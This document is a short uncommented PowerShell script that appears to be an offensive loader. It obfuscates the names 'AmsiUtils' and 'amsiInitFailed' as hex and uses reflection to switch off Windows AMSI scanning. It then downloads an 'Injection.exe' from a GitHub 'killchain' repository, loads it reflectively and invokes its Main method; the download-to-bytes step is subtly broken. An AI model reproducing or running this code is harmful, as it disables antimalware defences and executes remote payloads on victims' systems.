$k = $("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result);
$w = $("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result).Substring(9,14);
[Ref].Assembly.GetType('System.Management.Automation.' + $k).GetField($w, 'NonPublic,Static').SetValue($null, $true);
$path = (Invoke-WebRequest 'https://github.com/bakarilevy/killchain/Injection.exe').Content;
$bytes = [System.IO.File]::ReadAllBytes($path);
$assembly = [System.Reflection.Assembly]::Load($bytes);
$entryPointMethod = $assembly.GetTypes().Where({ $_.Name -eq 'Program' }, 'First').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic');
$entryPointMethod.Invoke($null, (, [string[]] ($null)));